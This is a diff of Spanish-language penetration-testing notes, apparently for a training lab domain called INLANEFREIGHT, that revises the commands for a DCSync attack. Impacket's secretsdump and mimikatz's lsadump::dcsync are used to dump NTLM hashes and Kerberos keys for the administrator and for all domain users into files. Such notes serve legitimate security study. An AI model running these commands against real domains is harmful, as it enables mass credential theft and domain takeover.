@@ -72,19 +72,18 @@ Son parte de una ACL en AD. Estos privilegios permiten replicar datos del AD. Ex
 #### Extraer hashes NTML y tickets kerberos - `secretsdump.py`
 
 ```powershell
-python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@$target
+impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@$target
 ```
 - La flag `-just-dc` indica que debe extraer los hashes del archivo NTDS.dit
 - Devolverá 3 archivos
 #### Extraer hashes NTML y kerberos - `mimikatz`
 - Extraer el hash de administrador
 	```powershell
-	privilege::debug 
 	lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator 
 	# Ó con un solo paso y guardando el contenido 
-	mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator" > resultado.txt
+	./mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator" "exit" > adminPass.txt
 	```
 - Extraer los hashes de todos los usuarios: 
 	```powershell
-	`mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /all" > resultado.txt`
+	`mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /all exit" > resultado.txt`
 	```
